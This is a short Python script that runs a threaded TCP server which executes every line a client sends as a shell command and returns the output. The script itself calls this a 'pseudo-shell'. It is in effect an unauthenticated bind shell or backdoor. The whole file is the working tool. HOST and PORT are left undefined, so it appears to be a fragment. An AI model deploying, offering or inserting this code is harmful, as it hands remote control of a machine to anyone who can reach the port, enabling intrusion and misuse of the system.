import socketserver, subprocess, ipaddress, netifaces, threading, time
class Service(socketserver.BaseRequestHandler):
    def run(self, command: str) -> None:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        return process.communicate()
    def send(self, data: str | bytes) -> None:
        if type(data) is str:
            data = data.encode("utf-8")
        self.request.sendall(data)
    def receive(self) -> str:
        return self.request.recv(4096).strip().decode("utf-8")
    def cwd(self) -> bytes:
        stderr, stdout = self.run("pwd")
        self.send(stderr + stdout)
    def handle(self) -> None:
        host, port = self.client_address
        while True:
            self.cwd()
            command = self.receive()
            try:
                if command.lower() == "quit":
                    self.send("[*] Received <quit>. Exiting pseudo-shell\n")
                    break
                else:
                    stderr, stdout = self.run(command)
                    self.send(stderr + stdout)
            except BrokenPipeError as e:
                break
class ThreadedService(
        socketserver.ThreadingTCPServer,
        socketserver.DatagramRequestHandler
):
    pass
server = ThreadedService((HOST,PORT), Service)
server.allow_reuse_address = True
server_thread = threading.Thread(target=server.serve_forever)
server_thread.daemon = True
server_thread.start()
host, port = server.server_address
while (threading.active_count() >= 2):
    time.sleep(10)
